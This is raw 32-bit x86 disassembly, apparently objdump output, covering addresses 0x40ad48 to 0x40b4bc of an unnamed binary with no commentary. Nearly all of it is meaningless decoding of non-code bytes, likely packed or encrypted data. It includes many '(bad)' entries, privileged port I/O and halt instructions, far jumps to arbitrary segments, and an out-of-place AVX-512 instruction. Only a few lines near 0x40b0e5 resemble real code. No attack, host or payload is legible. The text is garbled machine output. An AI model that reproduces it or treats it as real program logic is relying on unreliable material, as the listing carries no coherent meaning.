  40ad48:	adc    ebx,DWORD PTR [ecx]
  40ad4a:	call   0x87c6226a
  40ad4f:	mov    esp,0x8b60b970
  40ad54:	sbb    DWORD PTR [edi-0x2d9aaa2f],edi
  40ad5a:	je     0x40ad98
  40ad5c:	adc    eax,0x30922159
  40ad61:	xor    BYTE PTR [ecx],0x75
  40ad64:	or     ch,BYTE PTR [edi-0x4d1c451f]
  40ad6a:	adc    ebp,DWORD PTR [esi-0x2d]
  40ad6d:	push   ds
  40ad6e:	ins    DWORD PTR es:[edi],dx
  40ad6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad70:	mov    WORD PTR [ecx+0x25],?
  40ad73:	add    al,0xda
  40ad75:	or     BYTE PTR [esi-0x31],0x76
  40ad79:	dec    eax
  40ad7a:	mov    edx,0xed542708
  40ad7f:	(bad)
  40ad82:	mov    dl,BYTE PTR [edx+edi*2-0x411aa96c]
  40ad89:	mov    BYTE PTR [ecx+0x598fd951],dh
  40ad8f:	dec    ebp
  40ad90:	shr    DWORD PTR [edi-0xc],0x78
  40ad94:	fnstcw WORD PTR [ebx+esi*4+0x75fd24]
  40ad9b:	pop    ebx
  40ad9c:	xor    ecx,DWORD PTR [eax]
  40ad9e:	push   eax
  40ad9f:	jecxz  0x40ad79
  40ada1:	and    esi,DWORD PTR [ebp-0x2]
  40ada4:	inc    esp
  40ada5:	out    dx,eax
  40ada6:	into   
  40ada7:	mov    al,ds:0x5935f16d
  40adac:	out    0x95,al
  40adae:	gs dec ebp
  40adb0:	and    BYTE PTR [esi],ah
  40adb2:	add    bl,BYTE PTR [ebx]
  40adb4:	dec    esi
  40adb5:	adc    eax,0xa9bffa16
  40adba:	sbb    edi,ebx
  40adbc:	and    esi,DWORD PTR [ebx+0x35]
  40adbf:	int    0xc8
  40adc1:	imul   esp,DWORD PTR [eax+0x3dd8a930],0x643c5269
  40adcb:	xor    ecx,DWORD PTR [edi+0x562efe82]
  40add1:	rcr    DWORD PTR [ecx-0x5235b101],0xda
  40add8:	(bad)  [ecx]
  40adda:	inc    ecx
  40addb:	in     eax,0xf5
  40addd:	lahf   
  40adde:	fstp   QWORD PTR [ecx+0x42663ffd]
  40ade4:	adc    al,0x2a
  40ade6:	pop    ecx
  40ade7:	mov    dl,0xc2
  40ade9:	addr16 dec ecx
  40adeb:	repnz adc DWORD PTR [esi-0x46],ecx
  40adef:	(bad)  
  40adf0:	mov    ebx,0x6b7fc921
  40adf5:	or     al,0x57
  40adf7:	sub    BYTE PTR [ecx-0x71],bh
  40adfa:	ror    BYTE PTR [esi+0x4e],1
  40adfd:	call   0x699e274
  40ae02:	fchs   
  40ae04:	ss in  eax,dx
  40ae06:	hlt    
  40ae07:	mov    ecx,0xfda93bc0
  40ae0c:	xchg   BYTE PTR [edi+0x64],ch
  40ae0f:	lea    ebp,[edi]
  40ae11:	retf   0x28e0
  40ae14:	xlat   BYTE PTR ds:[ebx]
  40ae15:	dec    eax
  40ae16:	mov    edx,DWORD PTR [ebp-0x79]
  40ae19:	jae    0x40ae90
  40ae1b:	mov    BYTE PTR [eax],cl
  40ae1d:	sbb    eax,0xf3159301
  40ae22:	(bad)  
  40ae24:	out    dx,eax
  40ae25:	inc    eax
  40ae26:	adc    bl,BYTE PTR ds:0x88b50a4f
  40ae2c:	lea    ecx,[edx-0x3e]
  40ae2f:	mov    eax,0x4a03750f
  40ae34:	loop   0x40ae1b
  40ae36:	sub    eax,0x822c283c
  40ae3b:	or     ah,bh
  40ae3d:	leave  
  40ae3e:	pop    ds
  40ae3f:	xchg   esi,eax
  40ae40:	mov    bh,0xd2
  40ae42:	into   
  40ae43:	jb     0x40aebe
  40ae45:	iret   
  40ae46:	test   eax,0xa76b68da
  40ae4b:	sbb    DWORD PTR [eax-0x28],eax
  40ae4e:	and    al,0xd3
  40ae50:	dec    ecx
  40ae51:	clc    
  40ae52:	call   0x413e:0x54d62b52
  40ae59:	push   ebx
  40ae5a:	arpl   WORD PTR ds:0xcb5aafe4,si
  40ae60:	stc    
  40ae61:	mov    esi,ss
  40ae63:	xchg   bl,bh
  40ae65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae66:	lock add cl,ah
  40ae69:	xchg   ebx,eax
  40ae6a:	not    DWORD PTR [edx-0x3a3962dd]
  40ae70:	aas    
  40ae71:	cmp    BYTE PTR [esi],cl
  40ae73:	pop    esp
  40ae74:	pop    ss
  40ae75:	mov    ?,WORD PTR [edi-0x2c]
  40ae78:	sub    bh,cl
  40ae7a:	iret   
  40ae7b:	int    0x85
  40ae7d:	add    ah,BYTE PTR [ecx]
  40ae7f:	cmp    al,0x23
  40ae81:	lock retf 0xae98
  40ae85:	pop    ebp
  40ae86:	cmp    ch,ah
  40ae88:	jmp    0x40ae4b
  40ae8a:	push   eax
  40ae8b:	and    BYTE PTR [esi+0x3d],0x67
  40ae8f:	ror    BYTE PTR [edx+0x19],cl
  40ae92:	add    DWORD PTR [edi-0x3c],ecx
  40ae95:	icebp  
  40ae96:	jg     0x40ae40
  40ae98:	popa   
  40ae99:	loopne 0x40ae87
  40ae9b:	int3   
  40ae9c:	or     BYTE PTR [ebx-0x7252210c],ah
  40aea2:	vmptrst QWORD PTR [edi+0x13]
  40aea6:	retf   
  40aea7:	cli    
  40aea8:	mov    cl,0x93
  40aeaa:	repnz repz inc ecx
  40aead:	inc    edx
  40aeae:	(bad)  
  40aeaf:	into   
  40aeb0:	and    DWORD PTR [edi+0x71],0xe318ffa8
  40aeb7:	std    
  40aeb8:	ret    0x6750
  40aebb:	xacquire xchg DWORD PTR [ecx+0x67],edi
  40aebf:	inc    esp
  40aec0:	xchg   al,bh
  40aec2:	pop    ss
  40aec3:	adc    cl,BYTE PTR [eax+ebp*1-0x69]
  40aec7:	inc    ebp
  40aec8:	je     0x40aeda
  40aeca:	retf   0x9abe
  40aecd:	aad    0x21
  40aecf:	dec    ecx
  40aed0:	lahf   
  40aed1:	sub    DWORD PTR [edx-0x6dd3ab0e],edi
  40aed7:	(bad)  
  40aed9:	cs imul edx,esi,0x929f46d4
  40aee0:	aas    
  40aee1:	cmp    ebx,DWORD PTR [edi]
  40aee3:	out    0xb7,ax
  40aee6:	mov    ebx,0x9a270c24
  40aeeb:	xlat   BYTE PTR ds:[ebx]
  40aeec:	pushf  
  40aeed:	addr16 jo 0x40af5f
  40aef0:	push   edx
  40aef1:	mov    ds:0x8bf83fdc,al
  40aef6:	div    BYTE PTR [edx+0x1f]
  40aef9:	cmp    DWORD PTR [esi],esp
  40aefb:	push   cs
  40aefc:	add    al,0x45
  40aefe:	adc    dh,BYTE PTR [esi]
  40af00:	shl    BYTE PTR [esi],1
  40af02:	cmp    al,BYTE PTR [ebx]
  40af04:	push   cs
  40af05:	out    0x51,al
  40af07:	sahf   
  40af08:	jle    0x40af2d
  40af0a:	pop    eax
  40af0b:	lods   eax,DWORD PTR ds:[esi]
  40af0c:	dec    ebx
  40af0d:	mov    ss,WORD PTR [ecx]
  40af0f:	dec    esi
  40af10:	ret    
  40af11:	fabs   
  40af13:	mov    dl,0x8a
  40af15:	popa   
  40af16:	int    0xfb
  40af18:	mov    cl,0x3
  40af1a:	aad    0x29
  40af1c:	jno    0x40aea6
  40af1e:	(bad)  
  40af20:	cdq    
  40af21:	pop    esi
  40af22:	arpl   ax,bp
  40af24:	sbb    al,0xe3
  40af26:	call   0x35f3:0x890dd937
  40af2d:	bnd ds jbe 0x40aee2
  40af31:	cwde   
  40af32:	fst    st(7)
  40af34:	pop    ebp
  40af35:	retf   
  40af36:	ficom  WORD PTR [esi+eax*4]
  40af39:	out    dx,eax
  40af3a:	rol    dl,1
  40af3c:	jnp    0x40aec1
  40af3e:	xchg   ebx,eax
  40af3f:	mov    eax,ds:0xd997729d
  40af44:	dec    ecx
  40af45:	inc    ecx
  40af46:	out    dx,al
  40af47:	jns    0x40af8b
  40af49:	jmp    0xd149:0x7cc349c3
  40af50:	es push cs
  40af52:	outs   dx,DWORD PTR ds:[esi]
  40af53:	dec    esi
  40af54:	fwait
  40af55:	mov    esi,0x6d0b123e
  40af5a:	pop    es
  40af5b:	clc    
  40af5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af5d:	jns    0x40aedf
  40af5f:	scas   eax,DWORD PTR es:[edi]
  40af60:	mov    ecx,0xf38d01eb
  40af65:	int3   
  40af66:	push   edi
  40af67:	sub    BYTE PTR ss:[ecx-0xd],ah
  40af6b:	in     al,dx
  40af6c:	cld    
  40af6d:	addr16 inc esp
  40af6f:	mov    WORD PTR [ebx+0x21],?
  40af72:	mul    ebp
  40af74:	adc    ebx,DWORD PTR [ecx+0x3c]
  40af77:	aam    0xba
  40af79:	aam    0x14
  40af7b:	inc    edx
  40af7c:	or     al,0xde
  40af7e:	shl    DWORD PTR [ebx],cl
  40af80:	int3   
  40af81:	inc    esi
  40af82:	add    esi,DWORD PTR [eax-0x4f]
  40af85:	out    0x91,al
  40af87:	push   esi
  40af88:	and    cl,al
  40af8a:	mov    al,0x29
  40af8c:	sahf   
  40af8d:	xchg   edi,eax
  40af8e:	adc    DWORD PTR [ebx-0x6b1da94d],edi
  40af94:	push   ds
  40af95:	sub    esi,eax
  40af97:	rcl    BYTE PTR ds:0xb121a7b1,1
  40af9d:	dec    ebp
  40af9e:	stc    
  40af9f:	jmp    0xa78b:0xa4988e23
  40afa6:	xchg   BYTE PTR [edi],bh
  40afa8:	push   ecx
  40afa9:	sub    esi,DWORD PTR [edx-0x188bf205]
  40afaf:	pop    es
  40afb0:	push   ebp
  40afb1:	clc    
  40afb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afb3:	daa    
  40afb4:	int3   
  40afb5:	daa    
  40afb6:	pop    ebp
  40afb7:	jb     0x40afac
  40afb9:	jge    0x40af97
  40afbb:	jecxz  0x40afcd
  40afbd:	cmp    esi,0x3a9f7ad
  40afc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc4:	adc    BYTE PTR [edx+0x7187b25d],cl
  40afca:	ds mov ah,0xf2
  40afcd:	jb     0x40af5d
  40afcf:	out    dx,eax
  40afd0:	sbb    al,0x9b
  40afd2:	icebp  
  40afd3:	or     eax,0x2f596bd1
  40afd8:	in     eax,dx
  40afd9:	cdq    
  40afda:	setbe  bh
  40afdd:	jb     0x40b002
  40afdf:	adc    ah,bh
  40afe1:	lods   al,BYTE PTR ds:[esi]
  40afe2:	push   edi
  40afe3:	std    
  40afe4:	ins    DWORD PTR es:[edi],dx
  40afe5:	ins    DWORD PTR es:[edi],dx
  40afe6:	ficom  WORD PTR [eax-0x4cfdc8b6]
  40afec:	lea    edx,[esp+ebp*2+0x29]
  40aff0:	adc    al,0x32
  40aff2:	jge    0x40af7f
  40aff4:	and    BYTE PTR [esi+0x6c],al
  40aff7:	push   ebp
  40aff8:	xlat   BYTE PTR ds:[ebx]
  40aff9:	fbld   TBYTE PTR [edi]
  40affb:	mov    al,0xfd
  40affd:	jno    0x40afd0
  40afff:	mov    esp,0xebf5b59d
  40b004:	jmp    0xbecf9a7b
  40b009:	inc    ebx
  40b00a:	test   DWORD PTR [esi-0x5a],0xe5f43d58
  40b011:	mov    WORD PTR [ebx],es
  40b013:	xor    DWORD PTR [ebp-0x6e],edi
  40b016:	sub    ecx,esi
  40b018:	pop    ebx
  40b019:	loop   0x40b059
  40b01b:	adc    esp,eax
  40b01d:	cli    
  40b01e:	pop    es
  40b01f:	mov    ch,0x88
  40b021:	sahf   
  40b022:	retf   0xa51c
  40b025:	jbe    0x40b052
  40b027:	es pop eax
  40b029:	push   ds
  40b02a:	sub    eax,DWORD PTR [edi+0x2b19a128]
  40b030:	pop    ebx
  40b031:	xor    eax,0x10872f55
  40b036:	pushf  
  40b037:	(bad)  
  40b038:	lock sbb DWORD PTR ss:0xa68d4b5b,ebp
  40b040:	inc    ebx
  40b041:	sub    BYTE PTR [eax],bl
  40b043:	and    al,0xaa
  40b045:	or     bh,bh
  40b047:	pop    esp
  40b048:	lahf   
  40b049:	out    0x5e,eax
  40b04b:	ja     0x40b03c
  40b04d:	sub    ch,0xb7
  40b050:	push   edx
  40b051:	ins    DWORD PTR es:[edi],dx
  40b052:	cmc    
  40b053:	add    BYTE PTR [edx],bh
  40b055:	imul   ebx,DWORD PTR [edx],0x7b
  40b058:	dec    esp
  40b059:	sub    dl,ch
  40b05b:	push   eax
  40b05c:	fcom   QWORD PTR [ebx-0x33187e79]
  40b062:	pop    esi
  40b063:	pop    ss
  40b064:	int    0xff
  40b066:	nop
  40b067:	repz sub ebx,DWORD PTR [eax-0x78be7c95]
  40b06e:	test   ebx,ebp
  40b070:	mov    BYTE PTR [eax-0x2bb26d88],ah
  40b076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b077:	shl    DWORD PTR [ecx-0x57ed0b74],0x6
  40b07e:	xchg   esp,eax
  40b07f:	jno    0x40b0b9
  40b081:	inc    ebx
  40b082:	xor    al,0xf8
  40b084:	imul   ebx
  40b086:	cmp    DWORD PTR [edi+0x34504710],eax
  40b08c:	sahf   
  40b08d:	jg     0x40b0fd
  40b08f:	pop    es
  40b090:	jle    0x40b0ca
  40b092:	jnp    0x40b079
  40b094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b095:	ja     0x40b0e8
  40b097:	outs   dx,DWORD PTR ds:[esi]
  40b098:	xor    al,BYTE PTR [eax+0x63fe78d5]
  40b09e:	fld    QWORD PTR [edx-0x32]
  40b0a1:	xchg   DWORD PTR [edx-0x40],esi
  40b0a4:	dec    eax
  40b0a5:	adc    al,0xdd
  40b0a7:	(bad)  
  40b0a8:	dec    esp
  40b0a9:	push   esp
  40b0aa:	jmp    0x238250ef
  40b0af:	sahf   
  40b0b0:	push   ebx
  40b0b1:	retf   
  40b0b2:	mov    WORD PTR [edi+0x6b489b62],fs
  40b0b8:	xchg   edx,eax
  40b0b9:	(bad)  
  40b0ba:	jmp    0xcd99fcea
  40b0bf:	xlat   BYTE PTR ds:[ebx]
  40b0c0:	cmp    al,0x22
  40b0c2:	push   ebx
  40b0c3:	test   BYTE PTR [ebp-0x22],dh
  40b0c6:	pop    ds
  40b0c7:	sub    al,0x3c
  40b0c9:	sar    BYTE PTR [ebx],0x48
  40b0cc:	inc    eax
  40b0cd:	(bad)  
  40b0ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0cf:	test   al,0xc
  40b0d1:	sbb    ch,BYTE PTR [ebp-0x26478dec]
  40b0d7:	nop
  40b0d8:	dec    esp
  40b0d9:	lds    ebx,FWORD PTR [eax-0x3a88f917]
  40b0df:	fimul  DWORD PTR [ebx-0x39cc27bb]
  40b0e5:	add    eax,edi
  40b0e7:	mov    DWORD PTR [ebp-0x20],eax
  40b0ea:	mov    eax,DWORD PTR [ebp-0x4]
  40b0ed:	mov    DWORD PTR [ebp-0x24],eax
  40b0f0:	lea    eax,[ebp-0x98]
  40b0f6:	mov    DWORD PTR [ebp-0x8],eax
  40b0f9:	jmp    0x40b604
  40b0fe:	(bad)  
  40b0ff:	(bad)  
  40b100:	retf   0xcad1
  40b103:	rcl    ebp,1
  40b105:	fnstcw WORD PTR [ebx-0x31]
  40b108:	stc    
  40b109:	mov    ds:0xd44139bf,eax
  40b10e:	dec    esi
  40b10f:	nop
  40b110:	js     0x40b18a
  40b112:	push   0x7c
  40b114:	js     0x40b18e
  40b116:	jmp    0xa963:0x8a9620e4
  40b11d:	or     eax,DWORD PTR [ecx+0x29]
  40b120:	mov    DWORD PTR [ecx+0x68b27622],edx
  40b126:	mov    eax,ds:0x56b7576a
  40b12b:	lea    esp,[edx-0xe]
  40b12e:	fwait
  40b12f:	or     ch,ah
  40b131:	mov    esp,0xc8e96776
  40b136:	popf   
  40b137:	or     al,0xd9
  40b139:	fadd   QWORD PTR [edi]
  40b13b:	cmp    DWORD PTR [ebx],0x48
  40b13e:	imul   esp,DWORD PTR [edi+0x50f2970],0x76e8295e
  40b148:	adc    eax,0xcf8fa51c
  40b14d:	dec    edx
  40b14e:	cmp    bh,ah
  40b150:	lock adc DWORD PTR [edx],ebp
  40b153:	outs   dx,DWORD PTR ds:[esi]
  40b154:	xor    eax,0x6c67f787
  40b159:	xchg   ecx,eax
  40b15a:	mov    bl,0x2e
  40b15c:	xor    al,0x5
  40b15e:	test   BYTE PTR [ecx],al
  40b160:	loope  0x40b176
  40b162:	mov    al,ds:0x62a837f1
  40b167:	or     dh,BYTE PTR [eax-0x70]
  40b16a:	and    eax,0x7d51b6
  40b16f:	dec    esi
  40b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b171:	mov    edx,0x39303d49
  40b176:	mov    dl,0x33
  40b178:	pop    ebp
  40b179:	(bad)  
  40b17a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b17b:	jge    0x40b1f6
  40b17d:	sub    DWORD PTR [ebx-0x3c3e8980],eax
  40b183:	jecxz  0x40b17c
  40b185:	jmp    0x40b178
  40b187:	mov    ecx,0x9aa964a
  40b18c:	mov    esi,0xcb54e592
  40b191:	sub    eax,0xd535e961
  40b196:	push   ebx
  40b197:	jl     0x40b1be
  40b199:	sbb    eax,0x175c1e0d
  40b19e:	push   edx
  40b19f:	xchg   esi,eax
  40b1a0:	add    al,0xce
  40b1a2:	mov    ecx,0x83d242a
  40b1a7:	in     eax,dx
  40b1a8:	jl     0x40b135
  40b1aa:	fstp   st(1)
  40b1ac:	add    DWORD PTR [edi+0x346bbd96],ebx
  40b1b2:	sub    BYTE PTR ds:0xe3f29968,dh
  40b1b8:	add    ecx,DWORD PTR [ebx]
  40b1ba:	xchg   ebx,eax
  40b1bb:	je     0x40b1e8
  40b1bd:	inc    eax
  40b1be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1bf:	pop    es
  40b1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c1:	dec    edx
  40b1c2:	dec    ebx
  40b1c3:	mov    ch,0x42
  40b1c5:	push   edx
  40b1c6:	lock and BYTE PTR [ebx],dh
  40b1c9:	in     al,0x25
  40b1cb:	cwde   
  40b1cc:	cli    
  40b1cd:	add    DWORD PTR [esi+0x6083640c],esp
  40b1d3:	mov    bh,0x6b
  40b1d5:	test   eax,0xf4a801d0
  40b1da:	pop    ds
  40b1db:	mov    esp,0x1dd68342
  40b1e0:	cdq    
  40b1e1:	xchg   edx,eax
  40b1e2:	mov    ds:0xc6da735f,al
  40b1e7:	test   al,0xea
  40b1e9:	xchg   esi,eax
  40b1ea:	mov    bl,0xa8
  40b1ec:	sbb    cl,dh
  40b1ee:	push   esp
  40b1ef:	call   0x6de4:0x47be9c3e
  40b1f6:	dec    esp
  40b1f7:	jg     0x40b23f
  40b1f9:	scas   eax,DWORD PTR es:[edi]
  40b1fa:	fcomp  DWORD PTR [esi+ebx*4]
  40b1fd:	vpsllvw zmm4{k2},zmm4,QWORD PTR [esp+edx*1-0x196be938]{1to8}
  40b208:	add    DWORD PTR [eax-0x5a2c8748],edi
  40b20e:	push   ds
  40b20f:	or     bl,BYTE PTR [ebp-0x6b]
  40b212:	cmp    bl,BYTE PTR [edi]
  40b214:	dec    esi
  40b215:	hlt    
  40b216:	std    
  40b217:	inc    esi
  40b218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b219:	ror    ebp,cl
  40b21b:	loope  0x40b1b1
  40b21d:	cs ror esi,cl
  40b220:	fcomp  QWORD PTR [ecx]
  40b222:	sbb    al,0xef
  40b224:	scas   al,BYTE PTR es:[edi]
  40b225:	sbb    eax,0x629210fd
  40b22a:	icebp  
  40b22b:	pop    edx
  40b22c:	pop    ecx
  40b22d:	push   ecx
  40b22e:	inc    ebp
  40b22f:	cmp    DWORD PTR [ecx-0x4dad4bb4],edx
  40b235:	mov    ds,WORD PTR [esi+0x4b318000]
  40b23b:	ror    BYTE PTR [esi+ebp*2+0x28bfb73b],0xe5
  40b243:	test   DWORD PTR [edx+0x13c9f112],esi
  40b249:	hlt    
  40b24a:	mov    ds:0xa49aa5c2,al
  40b24f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b250:	(bad)  
  40b251:	push   edi
  40b252:	lods   eax,DWORD PTR ds:[esi]
  40b253:	das    
  40b254:	adc    eax,0x8d8a4e83
  40b259:	ror    BYTE PTR [esi],1
  40b25b:	out    dx,eax
  40b25c:	daa    
  40b25d:	push   ebp
  40b25e:	(bad)
  40b261:	loopne 0x40b2c1
  40b263:	add    al,0xa1
  40b265:	daa    
  40b266:	in     al,dx
  40b267:	sbb    eax,0xaca3b639
  40b26c:	jo     0x40b21b
  40b26e:	jns    0x40b223
  40b270:	gs popa 
  40b272:	and    esi,edi
  40b274:	js     0x40b234
  40b276:	cdq    
  40b277:	out    dx,eax
  40b278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b279:	gs xchg edx,eax
  40b27b:	pop    ss
  40b27c:	sub    DWORD PTR [ebp+0x28ea0dc2],edx
  40b282:	xor    DWORD PTR [edx+ebx*8+0x34],esp
  40b286:	mov    edx,0xa17ee780
  40b28b:	jmp    0x40b2e8
  40b28d:	int    0x1b
  40b28f:	pop    ss
  40b290:	pop    ss
  40b291:	retf   0xee72
  40b294:	cmp    ebx,ebx
  40b296:	jne    0x40b233
  40b298:	adc    al,0x38
  40b29a:	inc    ebx
  40b29b:	jmp    0x64ea47ba
  40b2a0:	jmp    0xf989a1b8
  40b2a5:	ds (bad) 
  40b2a7:	push   esi
  40b2a8:	push   esp
  40b2a9:	fbstp  TBYTE PTR [ecx+0x64]
  40b2ac:	jno    0x40b2cf
  40b2ae:	xor    eax,0xd17ca6ce
  40b2b3:	fsub   QWORD PTR [eax]
  40b2b5:	test   eax,0x6b6acc16
  40b2ba:	or     al,0xed
  40b2bc:	and    eax,0x6d16432c
  40b2c1:	mov    eax,ds:0xe04a8353
  40b2c6:	fstp   QWORD PTR [ebp+0x78]
  40b2c9:	xchg   edx,eax
  40b2ca:	pop    ds
  40b2cb:	(bad)  
  40b2cc:	shl    DWORD PTR [esi-0x380fdc5e],1
  40b2d2:	sub    BYTE PTR [edi],0xff
  40b2d5:	pop    ebx
  40b2d6:	mov    bl,0x72
  40b2d8:	dec    ebp
  40b2d9:	dec    edi
  40b2da:	or     eax,0xa9b0d004
  40b2df:	sahf   
  40b2e0:	sbb    BYTE PTR [ecx+0x24],dh
  40b2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2e4:	div    esi
  40b2e6:	mov    ecx,0x5a87e46f
  40b2eb:	add    ah,ch
  40b2ed:	pop    ecx
  40b2ee:	mov    fs,WORD PTR [ebx-0x3dc1a218]
  40b2f4:	(bad)  
  40b2f5:	inc    eax
  40b2f6:	sbb    al,0xff
  40b2f8:	into   
  40b2f9:	test   eax,0xb4d2ca9
  40b2fe:	les    eax,FWORD PTR [esi-0xc]
  40b301:	std    
  40b302:	jecxz  0x40b30e
  40b304:	inc    edx
  40b305:	inc    BYTE PTR [esi-0x1fe5f1f3]
  40b30b:	inc    ebp
  40b30c:	mov    esi,0x91d8fd74
  40b311:	rol    DWORD PTR [ebx+0x4d],0x89
  40b315:	lock stos DWORD PTR es:[edi],eax
  40b317:	push   ecx
  40b318:	out    dx,eax
  40b319:	adc    al,0x9a
  40b31b:	aaa    
  40b31c:	ror    DWORD PTR [ecx+0x6a751217],0x18
  40b323:	rol    BYTE PTR [ecx+edi*2-0xcb6de9],1
  40b32a:	mov    es,WORD PTR [eiz*2-0x6cb1b821]
  40b331:	sahf   
  40b332:	jo     0x40b379
  40b334:	or     eax,0x2cb4d2a2
  40b339:	push   0xffffffda
  40b33b:	out    dx,al
  40b33c:	jmp    FWORD PTR [edi+0x5a]
  40b33f:	popf   
  40b340:	popf   
  40b341:	dec    ebp
  40b342:	pop    esi
  40b343:	jecxz  0x40b32f
  40b345:	iret   
  40b346:	xchg   edx,eax
  40b347:	mov    WORD PTR [edi-0x41],fs
  40b34a:	aam    0x27
  40b34c:	repz es mov edi,0x4cac9fc3
  40b353:	ins    DWORD PTR es:[edi],dx
  40b354:	sbb    al,BYTE PTR [edx-0x59]
  40b357:	in     eax,dx
  40b358:	in     al,0xd3
  40b35a:	push   0x62402821
  40b35f:	iret   
  40b360:	neg    BYTE PTR [edi-0x59217e40]
  40b366:	sbb    al,bl
  40b368:	hlt    
  40b369:	cmp    eax,DWORD PTR [ecx+0x72e01cea]
  40b36f:	pusha  
  40b370:	and    ah,BYTE PTR [edx+0x37f7fa5f]
  40b376:	icebp  
  40b377:	inc    eax
  40b378:	push   eax
  40b379:	jle    0x40b3d5
  40b37b:	dec    edi
  40b37c:	lea    eax,[ebx]
  40b37e:	retf   
  40b37f:	or     bh,dh
  40b381:	mov    eax,0xfe2cb155
  40b386:	jne    0x40b36d
  40b388:	enter  0xcb6b,0xd2
  40b38c:	jl     0x40b363
  40b38e:	adc    BYTE PTR [edi+edx*2-0xb],bl
  40b392:	out    dx,eax
  40b393:	add    edi,eax
  40b395:	retf   0x7b3f
  40b398:	sti    
  40b399:	cdq    
  40b39a:	jno    0x40b366
  40b39c:	stos   BYTE PTR es:[edi],al
  40b39d:	mov    eax,ds:0xf2db1538
  40b3a2:	js     0x40b3a6
  40b3a4:	jmp    0xa78:0x3492f0bf
  40b3ab:	sbb    eax,0xdca9a4cc
  40b3b0:	push   ds
  40b3b1:	xor    eax,0x6f7beaeb
  40b3b6:	js     0x40b42d
  40b3b8:	(bad)  
  40b3ba:	(bad)  
  40b3bb:	xor    DWORD PTR [eax-0x7d],ecx
  40b3be:	jp     0x40b431
  40b3c0:	fdivr  QWORD PTR [ebx+0x75ae2e1]
  40b3c6:	cmp    edx,ebx
  40b3c8:	bound  edx,QWORD PTR [edi-0x6b]
  40b3cb:	daa    
  40b3cc:	js     0x40b352
  40b3ce:	sub    BYTE PTR ds:0x98a19579,0x89
  40b3d5:	xchg   ebp,eax
  40b3d6:	and    DWORD PTR [ecx],esp
  40b3d8:	aas    
  40b3d9:	pushf  
  40b3da:	dec    ebp
  40b3db:	repnz mov ecx,DWORD PTR [edi+0x34]
  40b3df:	std    
  40b3e0:	scas   al,BYTE PTR es:[edi]
  40b3e1:	push   esp
  40b3e2:	mov    ch,dh
  40b3e4:	inc    esp
  40b3e5:	in     al,0x66
  40b3e7:	pop    esi
  40b3e8:	sahf   
  40b3e9:	imul   edx,DWORD PTR [edx],0xffffffc2
  40b3ec:	(bad)  
  40b3ee:	pop    edx
  40b3ef:	dec    edx
  40b3f0:	mov    edi,0x2af112b1
  40b3f5:	cwde   
  40b3f6:	pop    ebp
  40b3f7:	mov    DWORD PTR [edx-0x1071ee4b],0xf5d30dee
  40b401:	(bad)  
  40b402:	js     0x40b3cd
  40b404:	dec    ebp
  40b405:	or     al,0x4d
  40b407:	sbb    eax,0xdfbeb516
  40b40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b40d:	bound  ebx,QWORD PTR [edx]
  40b40f:	push   cs
  40b410:	loop   0x40b40b
  40b412:	out    dx,eax
  40b413:	cs xchg ebp,eax
  40b415:	popf   
  40b416:	stc    
  40b417:	add    ebx,DWORD PTR [esi+esi*1-0x5d0849d]
  40b41e:	adc    eax,esp
  40b420:	out    dx,al
  40b421:	push   0x5c
  40b423:	pop    ebp
  40b424:	popf   
  40b425:	cmp    BYTE PTR [edi+0x59],bh
  40b428:	inc    ebp
  40b429:	lods   al,BYTE PTR ds:[esi]
  40b42a:	sbb    cl,bl
  40b42c:	cwde   
  40b42d:	test   eax,0x208d8709
  40b432:	pushf  
  40b433:	outs   dx,BYTE PTR ds:[esi]
  40b434:	adc    dl,dl
  40b436:	aam    0x61
  40b438:	(bad)  
  40b439:	push   ecx
  40b43a:	fmul   QWORD PTR [edi-0x382ecc8f]
  40b440:	je     0x40b485
  40b442:	xlat   BYTE PTR ds:[ebx]
  40b443:	mov    ds:0x16473c1e,eax
  40b448:	and    edi,eax
  40b44a:	xor    eax,0xc2ac372b
  40b44f:	outs   dx,BYTE PTR ds:[esi]
  40b450:	int3   
  40b451:	mov    DWORD PTR [ebp-0x5d],esp
  40b454:	adc    BYTE PTR [ecx],0x13
  40b457:	mov    eax,0x834fd70a
  40b45c:	lea    esi,[edx]
  40b45e:	push   esi
  40b45f:	sbb    eax,0x1c97857a
  40b464:	mov    bh,0x71
  40b466:	or     BYTE PTR [edi-0x2c],al
  40b469:	cmp    BYTE PTR [esi],cl
  40b46b:	(bad)  
  40b46c:	icebp  
  40b46d:	add    BYTE PTR [eax+0x3e],bh
  40b470:	adc    ch,cl
  40b472:	popa   
  40b473:	repnz or eax,0x2c39023e
  40b479:	ret    0x58e5
  40b47c:	sbb    al,0xe1
  40b47e:	imul   edi,DWORD PTR [ecx+edx*4-0x341ae535],0x2a1151f
  40b489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48a:	pop    DWORD PTR [edx+0x6a]
  40b48d:	adc    al,0xbd
  40b48f:	xor    al,0x8
  40b491:	and    al,0x7a
  40b493:	mov    dh,BYTE PTR [ecx+0x62ad1016]
  40b499:	add    esp,esp
  40b49b:	mov    eax,ds:0xdaa2c13c
  40b4a0:	lahf   
  40b4a1:	jmp    0x4b8f:0x9d308a70
  40b4a8:	lods   al,BYTE PTR ds:[esi]
  40b4a9:	cmp    al,0x97
  40b4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4ac:	ret    0xa201
  40b4af:	jne    0x40b515
  40b4b1:	push   esp
  40b4b2:	add    eax,0xe7224267
  40b4b7:	in     eax,dx
  40b4b8:	test   dl,0x47
  40b4bb:	(bad)  
  40b4bc:	hlt    
